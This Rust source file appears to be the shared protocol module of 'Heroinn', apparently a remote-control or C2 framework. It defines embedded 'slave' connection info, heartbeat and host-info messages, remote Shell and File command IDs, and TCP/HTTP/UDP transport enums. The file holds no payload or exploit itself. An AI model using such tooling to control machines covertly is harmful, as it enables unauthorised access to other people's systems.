use std::io::{BufWriter, Cursor, Read, Write};

use gen::CONNECTION_INFO_FLAG;
use serde::{Deserialize, Serialize};

pub mod ftp;
pub mod gen;
pub mod packet;
pub mod protocol;
pub mod rpc;
pub mod session;

pub const HEART_BEAT_TIME: u64 = 5;

#[derive(Debug, Clone)]
#[repr(align(1))]
pub struct SlaveDNA {
    pub flag: [u8; 8],
    pub size: [u8; 8],
    pub data: [u8; 1024],
}

impl SlaveDNA {
    pub fn new(data: &[u8]) -> Self {
        if data.len() > 1024 {
            panic!("data too long");
        }

        let mut buf = [0u8; 1024];
        for i in 0..data.len() {
            buf[i] = data[i];
        }

        Self {
            flag: CONNECTION_INFO_FLAG,
            size: (data.len() as u64).to_be_bytes(),
            data: buf,
        }
    }

    pub fn parse(data: &[u8]) -> std::io::Result<Self> {
        let mut reader = Cursor::new(data);
        let mut flag = [0u8; 8];
        reader.read_exact(&mut flag)?;

        let mut size = [0u8; 8];
        reader.read_exact(&mut size)?;

        let mut data = [0u8; 1024];
        reader.read_exact(&mut data)?;

        Ok(Self { flag, size, data })
    }

    pub fn serilize(&self) -> Vec<u8> {
        let mut ret = vec![];

        let mut writer = BufWriter::new(&mut ret);

        writer.write_all(&self.flag).unwrap();
        writer.write_all(&self.size).unwrap();
        writer.write_all(&self.data).unwrap();

        drop(writer);
        ret
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ConnectionInfo {
    pub protocol: u8,
    pub address: String,
    pub remark: String,
}

impl ConnectionInfo {
    pub fn parse(data: &Vec<u8>) -> std::io::Result<Self> {
        let ret: ConnectionInfo = serde_json::from_slice(data)?;
        Ok(ret)
    }

    pub fn serialize(&self) -> std::io::Result<Vec<u8>> {
        match serde_json::to_vec(self) {
            Ok(p) => Ok(p),
            Err(_) => {
                Err(std::io::Error::new(
                    std::io::ErrorKind::InvalidData,
                    "serilize TunnelRequest packet faild",
                ))
            }
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnClientMsgID {
    HostInfo,
    Heartbeat,
    SessionPacket,
    Unknow,
}

impl HeroinnClientMsgID {
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnClientMsgID::HostInfo => 0x00,
            HeroinnClientMsgID::Heartbeat => 0x01,
            HeroinnClientMsgID::SessionPacket => 0x02,
            HeroinnClientMsgID::Unknow => 0xff,
        }
    }

    pub fn from(v: u8) -> Self {
        match v {
            0x00 => HeroinnClientMsgID::HostInfo,
            0x01 => HeroinnClientMsgID::Heartbeat,
            0x02 => HeroinnClientMsgID::SessionPacket,
            _ => HeroinnClientMsgID::Unknow,
        }
    }
}

#[derive(Debug, PartialEq, Eq)]
pub enum HeroinnServerCommandID {
    Shell,
    File,
    SessionPacket,
    Unknow,
}

impl HeroinnServerCommandID {
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnServerCommandID::Shell => 0x00,
            HeroinnServerCommandID::File => 0x01,
            HeroinnServerCommandID::SessionPacket => 0x02,
            HeroinnServerCommandID::Unknow => 0xff,
        }
    }

    pub fn from(v: u8) -> Self {
        match v {
            0x00 => HeroinnServerCommandID::Shell,
            0x01 => HeroinnServerCommandID::File,
            0x02 => HeroinnServerCommandID::SessionPacket,
            _ => HeroinnServerCommandID::Unknow,
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum HeroinnProtocol {
    TCP,
    HTTP,
    UDP,
    Unknow,
}

impl HeroinnProtocol {
    pub fn to_u8(&self) -> u8 {
        match self {
            HeroinnProtocol::TCP => 0x00,
            HeroinnProtocol::HTTP => 0x01,
            HeroinnProtocol::UDP => 0x02,
            HeroinnProtocol::Unknow => 0xff,
        }
    }

    pub fn from(v: u8) -> Self {
        match v {
            0x00 => HeroinnProtocol::TCP,
            0x01 => HeroinnProtocol::HTTP,
            0x02 => HeroinnProtocol::UDP,
            _ => HeroinnProtocol::Unknow,
        }
    }
}

pub fn cur_timestamp_millis() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_millis()
        .try_into()
        .unwrap_or(0)
}

pub fn cur_timestamp_secs() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap()
        .as_secs()
        .try_into()
        .unwrap_or(0)
}
